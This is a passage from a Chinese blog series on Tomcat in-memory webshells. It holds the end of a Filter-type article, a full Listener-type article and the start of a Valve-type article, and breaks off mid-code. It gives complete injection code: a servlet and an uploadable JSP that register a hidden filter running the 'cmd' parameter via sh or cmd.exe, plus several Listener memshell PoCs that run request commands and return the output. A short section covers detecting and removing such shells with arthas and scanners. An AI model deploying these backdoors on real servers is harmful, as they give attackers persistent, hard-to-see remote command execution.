\no1.addURLPattern(\"/*\");  \no1.setFilterName(FilterName);  \no1.setDispatcher(DispatcherType.REQUEST.name());  \nstandardContext.addFilterMapBefore(o1);\n\n最终将它们都添加到 filterConfig 里面，再放到 web.xml 里面\nClass&lt;?> ApplicationFilterConfig = Class.forName(\"org.apache.catalina.core.ApplicationFilterConfig\");  \nConstructor&lt;?> declaredConstructor1 = ApplicationFilterConfig.getDeclaredConstructor(Context.class,FilterDef.class);  \ndeclaredConstructor1.setAccessible(true);  \nApplicationFilterConfig filterConfig = (ApplicationFilterConfig) declaredConstructor1.newInstance(standardContext,o);  \nfilterConfigs.put(FilterName,filterConfig);  \nresponse.getWriter().write(\"Success\");\n\n\n完整的 EXP 如下所示\n\nFilterShell.java\nimport org.apache.catalina.Context;  \nimport org.apache.catalina.core.ApplicationContext;  \nimport org.apache.catalina.core.ApplicationFilterConfig;  \nimport org.apache.catalina.core.StandardContext;  \nimport org.apache.tomcat.util.descriptor.web.FilterDef;  \nimport org.apache.tomcat.util.descriptor.web.FilterMap;  \n  \nimport javax.servlet.*;  \nimport javax.servlet.annotation.WebServlet;  \nimport javax.servlet.http.HttpServlet;  \nimport javax.servlet.http.HttpServletRequest;  \nimport javax.servlet.http.HttpServletResponse;  \nimport java.io.IOException;  \nimport java.io.InputStream;  \nimport java.lang.reflect.Constructor;  \nimport java.lang.reflect.Field;  \n  \nimport java.util.Map;  \nimport java.util.Scanner;  \n  \n@WebServlet(\"/demoServlet\")  \npublic class FilterShell extends HttpServlet &#123;  \n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123;  \n  \n  \n//        org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase = (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();  \n//        org.apache.catalina.webresources.StandardRoot standardroot = (org.apache.catalina.webresources.StandardRoot) webappClassLoaderBase.getResources();  \n//        org.apache.catalina.core.StandardContext standardContext = (StandardContext) standardroot.getContext();  \n//该获取StandardContext测试报错  \n Field Configs = null;  \n Map filterConfigs;  \n try &#123;  \n            //这里是反射获取ApplicationContext的context，也就是standardContext  \n ServletContext servletContext = request.getSession().getServletContext();  \n  \n Field appctx = servletContext.getClass().getDeclaredField(\"context\");  \n appctx.setAccessible(true);  \n ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);  \n  \n Field stdctx = applicationContext.getClass().getDeclaredField(\"context\");  \n stdctx.setAccessible(true);  \n StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);  \n  \n  \n  \n String FilterName = \"cmd_Filter\";  \n Configs = standardContext.getClass().getDeclaredField(\"filterConfigs\");  \n Configs.setAccessible(true);  \n filterConfigs = (Map) Configs.get(standardContext);  \n  \n if (filterConfigs.get(FilterName) == null)&#123;  \n                Filter filter = new Filter() &#123;  \n  \n                    @Override  \n public void init(FilterConfig filterConfig) throws ServletException &#123;  \n  \n                    &#125;  \n  \n                    @Override  \n public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;  \n                        HttpServletRequest req = (HttpServletRequest) servletRequest;  \n if (req.getParameter(\"cmd\") != null)&#123;  \n  \n                            InputStream in = Runtime.getRuntime().exec(req.getParameter(\"cmd\")).getInputStream();  \n//  \n Scanner s = new Scanner(in).useDelimiter(\"\\\\A\");  \n String output = s.hasNext() ? s.next() : \"\";  \n servletResponse.getWriter().write(output);  \n  \n return; &#125;  \n                        filterChain.doFilter(servletRequest,servletResponse);  \n &#125;  \n  \n                    @Override  \n public void destroy() &#123;  \n  \n                    &#125;  \n                &#125;;  \n //反射获取FilterDef，设置filter名等参数后，调用addFilterDef将FilterDef添加  \n Class&lt;?> FilterDef = Class.forName(\"org.apache.tomcat.util.descriptor.web.FilterDef\");  \n Constructor declaredConstructors = FilterDef.getDeclaredConstructor();  \n FilterDef o = (FilterDef)declaredConstructors.newInstance();  \n o.setFilter(filter);  \n o.setFilterName(FilterName);  \n o.setFilterClass(filter.getClass().getName());  \n standardContext.addFilterDef(o);  \n //反射获取FilterMap并且设置拦截路径，并调用addFilterMapBefore将FilterMap添加进去  \n Class&lt;?> FilterMap = Class.forName(\"org.apache.tomcat.util.descriptor.web.FilterMap\");  \n Constructor&lt;?> declaredConstructor = FilterMap.getDeclaredConstructor();  \n org.apache.tomcat.util.descriptor.web.FilterMap o1 = (FilterMap)declaredConstructor.newInstance();  \n  \n o1.addURLPattern(\"/*\");  \n o1.setFilterName(FilterName);  \n o1.setDispatcher(DispatcherType.REQUEST.name());  \n standardContext.addFilterMapBefore(o1);  \n  \n //反射获取ApplicationFilterConfig，构造方法将 FilterDef传入后获取filterConfig后，将设置好的filterConfig添加进去  \n Class&lt;?> ApplicationFilterConfig = Class.forName(\"org.apache.catalina.core.ApplicationFilterConfig\");  \n Constructor&lt;?> declaredConstructor1 = ApplicationFilterConfig.getDeclaredConstructor(Context.class,FilterDef.class);  \n declaredConstructor1.setAccessible(true);  \n ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) declaredConstructor1.newInstance(standardContext,o);  \n filterConfigs.put(FilterName,filterConfig);  \n response.getWriter().write(\"Success\");  \n  \n  \n &#125;  \n        &#125; catch (Exception e) &#123;  \n            e.printStackTrace();  \n &#125;  \n  \n  \n    &#125;  \n  \n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123;  \n        this.doPost(request, response);  \n &#125;  \n&#125;\n\n成功\n\n\n如果文件上传的话应该是上传一个 .jsp 文件\n&lt;%--\n  User: Drunkbaby\n  Date: 2022/8/27\n  Time: 上午10:31\n--%>\n&lt;%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %>\n&lt;%@ page import=\"org.apache.catalina.core.ApplicationContext\" %>\n&lt;%@ page import=\"java.lang.reflect.Field\" %>\n&lt;%@ page import=\"org.apache.catalina.core.StandardContext\" %>\n&lt;%@ page import=\"java.util.Map\" %>\n&lt;%@ page import=\"java.io.IOException\" %>\n&lt;%@ page import=\"org.apache.tomcat.util.descriptor.web.FilterDef\" %>\n&lt;%@ page import=\"org.apache.tomcat.util.descriptor.web.FilterMap\" %>\n&lt;%@ page import=\"java.lang.reflect.Constructor\" %>\n&lt;%@ page import=\"org.apache.catalina.core.ApplicationFilterConfig\" %>\n&lt;%@ page import=\"org.apache.catalina.Context\" %>\n&lt;%@ page import=\"java.io.InputStream\" %>\n&lt;%@ page import=\"java.util.Scanner\" %>\n\n&lt;%\n    final String name = \"Drunkbaby\";\n    // 获取上下文\n    ServletContext servletContext = request.getSession().getServletContext();\n\n    Field appctx = servletContext.getClass().getDeclaredField(\"context\");\n    appctx.setAccessible(true);\n    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);\n\n    Field stdctx = applicationContext.getClass().getDeclaredField(\"context\");\n    stdctx.setAccessible(true);\n    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);\n\n    Field Configs = standardContext.getClass().getDeclaredField(\"filterConfigs\");\n    Configs.setAccessible(true);\n    Map filterConfigs = (Map) Configs.get(standardContext);\n\n    if (filterConfigs.get(name) == null)&#123;\n        Filter filter = new Filter() &#123;\n            @Override\n            public void init(FilterConfig filterConfig) throws ServletException &#123;\n\n            &#125;\n\n            @Override\n            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;\n                HttpServletRequest req = (HttpServletRequest) servletRequest;\n                if (req.getParameter(\"cmd\") != null) &#123;\n                    boolean isLinux = true;\n                    String osTyp = System.getProperty(\"os.name\");\n                    if (osTyp != null &amp;&amp; osTyp.toLowerCase().contains(\"win\")) &#123;\n                        isLinux = false;\n                    &#125;\n                    String[] cmds = isLinux ? new String[] &#123;\"sh\", \"-c\", req.getParameter(\"cmd\")&#125; : new String[] &#123;\"cmd.exe\", \"/c\", req.getParameter(\"cmd\")&#125;;\n                    InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();\n                    Scanner s = new Scanner( in ).useDelimiter(\"\\\\a\");\n                    String output = s.hasNext() ? s.next() : \"\";\n                    servletResponse.getWriter().write(output);\n                    servletResponse.getWriter().flush();\n                    return;\n                &#125;\n                filterChain.doFilter(servletRequest, servletResponse);\n            &#125;\n\n            @Override\n            public void destroy() &#123;\n\n            &#125;\n\n        &#125;;\n\n        FilterDef filterDef = new FilterDef();\n        filterDef.setFilter(filter);\n        filterDef.setFilterName(name);\n        filterDef.setFilterClass(filter.getClass().getName());\n        standardContext.addFilterDef(filterDef);\n\n        FilterMap filterMap = new FilterMap();\n        filterMap.addURLPattern(\"/*\");\n        filterMap.setFilterName(name);\n        filterMap.setDispatcher(DispatcherType.REQUEST.name());\n\n        standardContext.addFilterMapBefore(filterMap);\n\n        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);\n        constructor.setAccessible(true);\n        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);\n\n        filterConfigs.put(name, filterConfig);\n        out.print(\"Inject Success !\");\n    &#125;\n%>\n&lt;html>\n&lt;head>\n    &lt;title>filter&lt;/title>\n&lt;/head>\n&lt;body>\n    Hello Filter\n&lt;/body>\n&lt;/html>\n\n\n到时候上传这个 jsp 马即可\n0x05 排查 Java 内存马的几个方法感觉内存马的排查也是很重要的，因为最近也要准备 AWD 了，所以先整理一下这些防御的内容\n这里的内容参考木头师傅\nhttp://wjlshare.com/archives/1529\narthas项目链接：https://github.com/alibaba/arthas\n我们可以利用该项目来检测我们的内存马\njava -jar arthas-boot.jar --telnet-port 9998 --http-port -1\n这里也可以直接 java -jar arthas-boot.jar\n这里选择我们 Tomcat 的进程\n\n\n输入 1 之后会进入如下进程\n\n\n利用 sc *.Filter 进行模糊搜索，会列出所有调用了 Filter 的类？\n\n\n利用jad --source-only org.apache.jsp.evil_jsp 直接将 Class 进行反编译，这样就完成了防御。\n\n\n同时也可以进行监控 ，当我们访问 url 就会输出监控结果\nwatch org.apache.catalina.core.ApplicationFilterFactory createFilterChain &#39;returnObj.filters.&#123;?#this!=null&#125;.&#123;filterClass&#125;&#39;\ncopagent项目链接：https://github.com/LandGrey/copagent\n也是一款可以检测内存马的工具\njava-memshell-scanner项目链接：https://github.com/c0ny1/java-memshell-scanner\nc0ny1 师傅写的检测内存马的工具，能够检测并且进行删除，是一个非常方便的工具，工具界面如图\n\n\n该工具是由 jsp 实现的，我们这里主要来学习一下 c0ny1 师傅 删除内存马的逻辑\n检测是通过遍历 filterMaps 中的所有 filterMap 然后显示出来，让我们自己认为判断，所以这里提供了 dumpclass\n\n\n删除的话，这里主要是通过反射调用 StandardContext#removeFilterDef 方法来进行删除\n\n\n0x06 小结这么学习下来感觉内存马的注入，不知道怎么具体实现，总的来说可以归结为获取到 StandContext，然后通过反射注入。表现形式为 Filter。具体的实施可以是上传 .jsp 文件\n0x07 参考资料http://wjlshare.com/archives/1529https://blog.csdn.net/qq_34101364/article/details/120856415https://www.cnblogs.com/nice0e3/p/14622879.html#servletcontext\n","categories":["Java"],"tags":["Java"]},{"title":"Java内存马系列-04-Tomcat 之 Listener 型内存马","url":"/2022/08/27/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-04-Tomcat-%E4%B9%8B-Listener-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/","content":"\n本文首发于 FreeBuf https://www.freebuf.com/articles/web/343735.html\n\n\nJava 内存马系列-04-Tomcat 之 Listener 型内存马0x01 前言内存马给我最大的感受是，它可以有很强的隐蔽性，但是攻击方式也是比较局限，仅仅是文件上传这种，相比于反序列化其实，反序列化的危害性要强的多的多。\n之前在前文基础内容里面已经提过了 Tomcat 的一些架构知识，这里的话就不再赘述，简单写一下 Listener 的基础知识。\n0x02 Listener 基础知识Java Web 开发中的监听器（Listener）就是 Application、Session 和 Request 三大对象创建、销毁或者往其中添加、修改、删除属性时自动执行代码的功能组件。\n用途可以使用监听器监听客户端的请求、服务端的操作等。通过监听器，可以自动出发一些动作，比如监听在线的用户数量，统计网站访问量、网站访问监控等。\nListener 三个域对象\nServletContextListener\nHttpSessionListener\nServletRequestListener\n\n很明显，ServletRequestListener 是最适合用来作为内存马的。因为 ServletRequestListener 是用来监听 ServletRequest对 象的，当我们访问任意资源时，都会触发ServletRequestListener#requestInitialized()方法。下面我们来实现一个恶意的 Listener\n0x03 Listener 基础代码实现\n和之前 Filter 型内存马的原理其实是一样的，之前我们说到 Filter 内存马需要定义一个实现 Filter 接口的类，Listener 也是一样，我们直接在之前创建好的 Servlet 项目里面冻手。\n\n要求 Listener 的业务对象要实现 EventListener 这个接口\n我们可以先去看一下 EventListener 这个接口\n\n\n它有非常多的实现类，那么如果我们需要实现内存马的话就需要找一个每个请求都会触发的 Listener，我们去寻找的时候一定是优先找 Servlet 开头的类。\n这里我找到了 ServletRequestListener ，因为根据名字以及其中的 requestInitialized() 方法感觉我们的发送的每个请求都会触发这个监控器。\n\n\n这里我们尝试自己写一个 Listener，并进行测试。\n因为前面猜想 requestInitialized() 方法可以触发 Listener 监控器，所以我们在 requestInitialized() 方法里面加上一些代码，来证明它何时被执行。\npackage Listener;  \n  \nimport javax.servlet.ServletRequestEvent;  \nimport javax.servlet.ServletRequestListener;  \nimport javax.servlet.annotation.WebListener;  \nimport java.util.EventListener;  \n  \n@WebListener(\"/listenerTest\")  \npublic class ListenerTest implements ServletRequestListener &#123;  \n  \n    public ListenerTest()&#123;  \n    &#125;  \n  \n    @Override  \n public void requestDestroyed(ServletRequestEvent sre) &#123;  \n  \n    &#125;  \n  \n    @Override  \n public void requestInitialized(ServletRequestEvent sre) &#123;  \n        System.out.println(\"Listener 被调用\");  \n &#125;  \n&#125;\n\n\n同样是需要我们修改 web.xml 文件的，添加如下\n\n&lt;listener>  \n &lt;listener-class>Listener.ListenerTest&lt;/listener-class>  \n&lt;/listener>\n\n接着访问对应的路径即可，这里是因人而异的。\n当我们访问对应路径的时候，会在控制台打印出如下的信息\n\n\n至此，Listener 基础代码实现完成，下面我们来分析 Listener 的运行流程。\n0x04 Listener 流程分析\n流程分析的意义是让我们能够正确的写入恶意的内存马，具体要解决的其实有以下两个问题：\n\n1、 我们的恶意代码应该在哪儿编写？2、 1.  Tomcat 中的 Listener 是如何实现注册的？\n1. 应用开启前先读取 web.xml一开始我是把断点下在 requestInitialized() 方法这里的，后续发现进不去，于是看了其他师傅的文章，才知道是：在启动应用的时候，ContextConfig 类会去读取配置文件，所以我们去到 ContextConfig 这个类里面找一下哪个方法是来读取配置文件的。\n\n找了很久，主要是去看谁调用了 web.xml，最好是谁把 web.xml 作为参数传进去，因为一般作为参数传进去，才会进行大处理，发现是 configureContext() 方法\n\n\n\n这个方法主要是做一些读取数据并保存的工作，我们不难发现其中读取了 Filter 等 Servlet 组件，我们重点肯定是关注于 Listener 的读取的，最后找到在这个地方读取了 web.xml\n\n\n所以这个地方，1235 行可以先打个断点，接着我们继续往里看 ———— addApplicationListener() 这个方法，进去之后发现是一个接口中的方法，我们去找它的实现方法\n\n\n第一个 FailedContext 类里面的 addApplicationListener() 是没东西的，东西在 StandContext 里面。\n\n明白断点后开始调试：\n\n一开始我们的第一步，直接获取到 web.xml，如图\n\n\n我们看到 webxml 里面的 listener 已经有了对应的 Listener 文件，继续往下走。\n总的代码比较啰嗦，但是耐心一点也还好，我们下一步应该是走到 addApplicationListener() 这里的\n\n\n读取完配置文件，加载 Listener当我们读取完配置文件，当应用启动的时候，StandardContext 会去调用 listenerStart() 方法。这个方法做了一些基础的安全检查，最后完成简单的 start 业务。\n\n\n刚开始的地方，listenerStart() 方法中有这么一个语句：\nString listeners[] = findApplicationListeners();\n\n这里实际就是把之前的 Listener 存到这里面，之前看某位师傅的文章这个地方分析半天，其实根本没必要，这里自己心里有个数就好了，我也就不跟断点了，这个调试过程非常烦杂，没有必要\n2. 应用运行过程我们最先开始调试，肯定是把断点下在 requestInitialized() 方法这里的，调试之后发现一个什么问题呢？是我们走进去之后的代码没有什么实际作用，其实这里是断点下错了，正确的断点位置应该下在这里。\n\n\n正确的断点位置如图\n\n\n开始调试，这里我们先进到 getApplicationEventListeners() 方法里面\n\n\ngetApplicationEventListeners() 方法做了这么一件事：获取一个 Listener 数组\npublic Object[] getApplicationEventListeners() &#123;\n        return applicationEventListenersList.toArray();\n&#125;\n\n我们可以点进去看一下 applicationEventListenersList 是什么，可以看到 Listener 实际上是存储在 applicationEventListenersList 属性中的。\n\n\n并且我们可以通过 StandardContext#addApplicationEventListener() 方法来添加 Listener\npublic void addApplicationEventListener(Object listener) &#123;\n        applicationEventListenersList.add(listener);\n&#125;\n\n\n\n到这一步的调试就没有内容了，所以这里的逻辑有应该是和 Filter 差不多的，Listener 这里有一个 Listener 数组，对应的 Filter 里面也有一个 Filter 数组。\n\n在 Listener 组内的 Listeners 会被逐个触发，最后到我们自己定义的 Listener 的 requestInitialized() 方法去。\n\n\n3. 小结运行流程\n在应用开始前，先读取了 web.xml，从中读取到 Listeners，并进行加载；加载完毕之后会进行逐个读取，对每一个 Listener，都会到 requestInitialized() 方法进去。\n\n0x05 Listner 型内存马 EXP 编写1. EXP 分析如果我们要实现 EXP，要做哪些步骤呢？\n\n很明显的一点是，我们的恶意代码肯定是写在对应 Listener 的 requestInitialized() 方法里面的。\n通过 StandardContext 类的 addApplicationEventListener() 方法把恶意的 Listener 放进去。\n\nListener 与 Filter 的大体流程是一样的，所以我们也可以把 Listener 先放到整个 Servlet 最前面去\n这就是最基础的两步了，如果排先后顺序的话一定是先获取 StandardContext 类，再通过 addApplicationEventListener() 方法把恶意的 Listener 放进去，我们可以用流程图来表示一下运行过程。\n\n\n2. EXP 编写我们一步步来实现整个 EXP\n\n首先做最简单的工作 ———— 编写恶意的代码\n\nString cmd;\n        try &#123;\n            cmd = sre.getServletRequest().getParameter(\"cmd\");\n            org.apache.catalina.connector.RequestFacade requestFacade = (org.apache.catalina.connector.RequestFacade) sre.getServletRequest();\n            Field requestField = Class.forName(\"org.apache.catalina.connector.RequestFacade\").getDeclaredField(\"request\");\n            requestField.setAccessible(true);\n            Request request = (Request) requestField.get(requestFacade);\n            Response response = request.getResponse();\n\n            if (cmd != null)&#123;\n                InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();\n                int i = 0;\n                byte[] bytes = new byte[1024];\n                while ((i=inputStream.read(bytes)) != -1)&#123;\n                    response.getWriter().write(new String(bytes,0,i));\n                    response.getWriter().write(\"\\r\\n\");\n                &#125;\n            &#125;\n        &#125;catch (Exception e)&#123;\n            e.printStackTrace();\n        &#125;\n\n\n接着是获取 StandardContext 的代码，并且添加 Listener\n在 StandardHostValve#invoke 中，可以看到其通过request对象来获取 StandardContext 类\n\n\n同样地，由于JSP内置了request对象，我们也可以使用同样的方式来获取\n&lt;%\n    Field reqF = request.getClass().getDeclaredField(\"request\");\n    reqF.setAccessible(true);\n    Request req = (Request) reqF.get(request);\n    StandardContext context = (StandardContext) req.getContext();\n%>\n\n接着我们编写一个恶意的Listener\n&lt;%!\n    public class Shell_Listener implements ServletRequestListener &#123;\n \n        public void requestInitialized(ServletRequestEvent sre) &#123;\n            HttpServletRequest request = (HttpServletRequest) sre.getServletRequest();\n            String cmd = request.getParameter(\"cmd\");\n            if (cmd != null) &#123;\n                try &#123;\n                    Runtime.getRuntime().exec(cmd);\n                &#125; catch (IOException e) &#123;\n                    e.printStackTrace();\n                &#125; catch (NullPointerException n) &#123;\n                    n.printStackTrace();\n                &#125;\n            &#125;\n        &#125;\n \n        public void requestDestroyed(ServletRequestEvent sre) &#123;\n        &#125;\n    &#125;\n%>\n\n\n最后添加监听器\n&lt;%\n\tShell_Listener shell_Listener = new Shell_Listener();\n    context.addApplicationEventListener(shell_Listener);\n%>\n\n3. 最终 PoCJSP 版&lt;%@ page import=\"org.apache.catalina.core.StandardContext\" %>  \n&lt;%@ page import=\"java.util.List\" %>  \n&lt;%@ page import=\"java.util.Arrays\" %>  \n&lt;%@ page import=\"org.apache.catalina.core.ApplicationContext\" %>  \n&lt;%@ page import=\"java.lang.reflect.Field\" %>  \n&lt;%@ page import=\"java.util.ArrayList\" %>  \n&lt;%@ page import=\"java.io.InputStream\" %>  \n&lt;%@ page import=\"org.apache.catalina.connector.Request\" %>  \n&lt;%@ page import=\"org.apache.catalina.connector.Response\" %>  \n&lt;%!  \n  \n    class ListenerMemShell implements ServletRequestListener &#123;  \n  \n        @Override  \n        public void requestInitialized(ServletRequestEvent sre) &#123;  \n            String cmd;  \n            try &#123;  \n                cmd = sre.getServletRequest().getParameter(\"cmd\");  \n                org.apache.catalina.connector.RequestFacade requestFacade = (org.apache.catalina.connector.RequestFacade) sre.getServletRequest();  \n                Field requestField = Class.forName(\"org.apache.catalina.connector.RequestFacade\").getDeclaredField(\"request\");  \n                requestField.setAccessible(true);  \n                Request request = (Request) requestField.get(requestFacade);  \n                Response response = request.getResponse();  \n  \n                if (cmd != null)&#123;  \n                    InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();  \n                    int i = 0;  \n                    byte[] bytes = new byte[1024];  \n                    while ((i=inputStream.read(bytes)) != -1)&#123;  \n                        response.getWriter().write(new String(bytes,0,i));  \n                        response.getWriter().write(\"\\r\\n\");  \n                    &#125;  \n                &#125;  \n            &#125;catch (Exception e)&#123;  \n                e.printStackTrace();  \n            &#125;  \n        &#125;  \n  \n        @Override  \n        public void requestDestroyed(ServletRequestEvent sre) &#123;  \n        &#125;  \n    &#125;  \n%>  \n  \n&lt;%  \n    ServletContext servletContext =  request.getServletContext();  \n    Field applicationContextField = servletContext.getClass().getDeclaredField(\"context\");  \n    applicationContextField.setAccessible(true);  \n    ApplicationContext applicationContext = (ApplicationContext) applicationContextField.get(servletContext);  \n  \n    Field standardContextField = applicationContext.getClass().getDeclaredField(\"context\");  \n    standardContextField.setAccessible(true);  \n    StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);  \n  \n    Object[] objects = standardContext.getApplicationEventListeners();  \n    List&lt;Object> listeners = Arrays.asList(objects);  \n    List&lt;Object> arrayList = new ArrayList(listeners);  \n    arrayList.add(new ListenerMemShell());  \n    standardContext.setApplicationEventListeners(arrayList.toArray());  \n  \n%>\n\n成功\n\n\n\n这是 JSP 的写法，我们还可以和 Filter 型内存马一样，用 .java 的写法来完成。\n\nPoC 如下，我这里实验失败了，师傅们可以自行测试一下\npackage Listener;  \n  \nimport javax.servlet.ServletRequestEvent;  \nimport javax.servlet.ServletRequestListener;  \nimport javax.servlet.annotation.WebListener;  \nimport javax.servlet.http.HttpServletRequest;  \nimport javax.servlet.http.HttpServletResponse;  \nimport java.io.BufferedReader;  \nimport java.io.InputStream;  \nimport java.io.InputStreamReader;  \nimport java.lang.reflect.Field;  \n  \n@WebListener  \npublic class ListenerShell implements ServletRequestListener &#123;  \n    @Override  \n public void requestDestroyed(ServletRequestEvent servletRequestEvent) &#123;  \n    &#125;  \n  \n    @Override  \n public void requestInitialized(ServletRequestEvent servletRequestEvent) &#123;  \n        HttpServletRequest req = (HttpServletRequest)servletRequestEvent.getServletRequest();  \n HttpServletResponse resp = this.getResponseFromRequest(req);  \n String cmd = req.getParameter(\"cmd\");  \n try &#123;  \n            String result = this.CommandExec(cmd);  \n resp.getWriter().println(result);  \n System.out.println(\"部署完成\");  \n &#125; catch (Exception e) &#123;  \n  \n        &#125;  \n    &#125;  \n    public String CommandExec(String cmd) throws Exception &#123;  \n        Runtime rt = Runtime.getRuntime();  \n Process proc = rt.exec(cmd);  \n InputStream stderr =  proc.getInputStream();  \n InputStreamReader isr = new InputStreamReader(stderr);  \n BufferedReader br = new BufferedReader(isr);  \n String line = null;  \n StringBuffer sb = new StringBuffer();  \n while ((line = br.readLine()) != null) &#123;  \n            sb.append(line + \"\\n\");  \n &#125;  \n        return sb.toString();  \n &#125;  \n  \n    public synchronized HttpServletResponse getResponseFromRequest(HttpServletRequest var1) &#123;  \n        HttpServletResponse var2 = null;  \n  \n try &#123;  \n            Field var3 = var1.getClass().getDeclaredField(\"response\");  \n var3.setAccessible(true);  \n var2 = (HttpServletResponse)var3.get(var1);  \n &#125; catch (Exception var8) &#123;  \n            try &#123;  \n                Field var4 = var1.getClass().getDeclaredField(\"request\");  \n var4.setAccessible(true);  \n Object var5 = var4.get(var1);  \n Field var6 = var5.getClass().getDeclaredField(\"response\");  \n var6.setAccessible(true);  \n var2 = (HttpServletResponse)var6.get(var5);  \n &#125; catch (Exception var7) &#123;  \n            &#125;  \n        &#125;  \n  \n        return var2;  \n &#125;  \n&#125;\n\n\n0x06 小结相对于 Filter 型内存马来说，Listener 型内存马的实现更为简易的多，从难度上来说，可以把 Listener 型内存马需要实现的步骤看成是 Filter 型内存马的一部分。\n0x07 参考资料https://goodapple.top/archives/1355http://wjlshare.com/archives/1651\n","categories":["Java"],"tags":["Java"]},{"title":"Java内存马系列-06-Tomcat 之 Valve 型内存马","url":"/2022/09/07/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-06-Tomcat-%E4%B9%8B-Valve-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/","content":"Valve 型内存马\n\nJava 内存马系列-06-Tomcat 之 Valve 型内存马0x01 前言Valve 内存马与之前的三种内存马区别还是有点大的，之前内存马是放在 Web 请求之中的，Listener —-&gt; Filter —-&gt; Servlet 的流程，但是 Valve 内存马是在 Pipeline 之中的一个流程，可以说区别是有点小大了。\n0x02 Valve 是什么我们要学习 Valve 型内存马，就必须要先了解一下 Valve 是什么\n这一段内容引用枫师傅的文章原话，因为枫师傅这段话我觉得写的非常清楚，师傅们可以学习一下\n“\n在了解 Valve 之前，我们先来简单了解一下 Tomcat 中的管道机制。\n我们知道，当 Tomcat 接收到客户端请求时，首先会使用 Connector 进行解析，然后发送到 Container 进行处理。那么我们的消息又是怎么在四类子容器中层层传递，最终送到 Servlet 进行处理的呢？这里涉及到的机制就是 Tomcat 管道机制。\n管道机制主要涉及到两个名词，Pipeline（管道）和 Valve（阀门）。如果我们把请求比作管道（Pipeline）中流动的水，那么阀门（Valve）就可以用来在管道中实现各种功能，如控制流速等。\n因此通过管道机制，我们能按照需求，给在不同子容器中流通的请求添加各种不同的业务逻辑，并提前在不同子容器中完成相应的逻辑操作。个人理解就是管道与阀门的这种模式，我们可以通过调整阀门，来实现不同的业务。\n”\nPipeline 中会有一个最基础的 Valve，这个 Valve 也被称之为 basic，它始终位于末端（最后执行），它在业务上面的表现是封装了具体的请求处理和输出响应。\nPipeline 提供了 addValve 方法，可以添加新 Valve 在 basic 之前，并按照添加顺序执行。\n\n简单理解也就是和 Filter 当中差不多，我们可以在 Filter Chain 当中任意添加 Filter；那么 Valve 也就是可以在 Pipline 当中任意添加。\n\n下面是 Pipeline 发挥功能的原理图\n\n\n在 Tomcat 中，四大组件 Engine、Host、Context 以及 Wrapper  都有其对应的 Valve 类，StandardEngineValve、StandardHostValve、StandardContextValve 以及 StandardWrapperValve，他们同时维护一个 StandardPipeline 实例。\n上图的 basic 就是在前文中提到的最基础的 Valve\n\n它其实在我写的上一篇文章里面恰好出现过\n\n\n\n这是获取 HTTP 请求的阶段，也就是这个里面，我们获取到了 Pipeline，并且能够很清楚的看到 Pipeline 里面有一个 basic；这个 basic 所属的类是 StandardEngineValve\n0x03 关于 Valve 内存马的流程思考内存马流程Valve 可以被添加进 Pipeline 的流程之后，所以这里我们尝试实现一下。\n先实现基础的 Valve\npackage tomcatShell.valve;  \n  \nimport org.apache.catalina.connector.Request;  \nimport org.apache.catalina.connector.Response;  \nimport org.apache.catalina.valves.ValveBase;  \n  \nimport javax.servlet.ServletException;  \nimport java.io.IOException;  \n  \npublic class ValveTest extends ValveBase &#123;  \n    @Override  \n public void invoke(Request request, Response response) throws IOException, ServletException &#123;  \n        System.out.println(\"Valve 被成功调用\");  \n &#125;  \n&#125;\n\n我们还需要通过 addValve() 方法把它添加进去，不然的话这个 Valve 肯定是白写的。反之一想，我们只要能把我们自己编写的恶意 Valve 添加进去，就可以造成恶意马的写入了。\n一开始感觉没什么思路，先点进去 Pipeline 接口看一下，因为 Valve 是 Pipeline 的一个部分，所以我们点进去看看。\n\n\n\n在 Pipeline 接口当中存在 addValve() 方法，顾名思义，我们可以通过这个方法把 Valve 添加进去。\n\naddValve() 方法对应的实现类是 StandardPipeline，但是我们是无法直接获取到 StandardPipeline 的，所以这里去找一找 StandardContext 有没有获取到 StandardPipeline 的手段。\n\n\n在 StandardContext 类中搜索 pipeline，这里看到了一个比较引人注目的方法 ———— getPipeline()，跟进看一下。\n\n\n可以看一下注解，这里写着 return 一个 Pipeline 类型的类，它是用来管理 Valves 的，所以这个语句证明了下面这一点：\nStandardContext.getPipeline = StandardPipeline; // 二者等价\n\n所以这里我们可以得到的攻击思路如下：\n\n先获取 StandardContext\n编写恶意 Valve\n通过 StandardContext.getPipeline().addValve() 添加恶意 Valve\n\nValve 型内存马应该在何处被加载到这里大概是没问题了，但是后续在自己手写 EXP 的过程中，发现了一个比较严重的问题：我们的 Valve 是应该放到 Filter，Listener，还是 Servlet 里面。\n\n这个答案是 Servlet，因为在 Servlet 内存马中的 HTTP11Processor 的加载 HTTP 请求当中，是出现了 Pipeline 的 basic 的。\n所以我们通过 Servlet 来加载。\n\n明确了上述的几点后，就可以开始编写 PoC 了。\n0x04 Valve 内存马的 PoC 编写这里我们需要先定义一个 doGet() 方法，因为我们是发出 GET 请求的，通过 doGet() 方法获取到 request 对象。\n代码如下\npublic class ValveShell_Servlet extends HttpServlet &#123;  \n  \n    @Override  \n protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;  \n        try &#123;  \n            Field FieldReq = 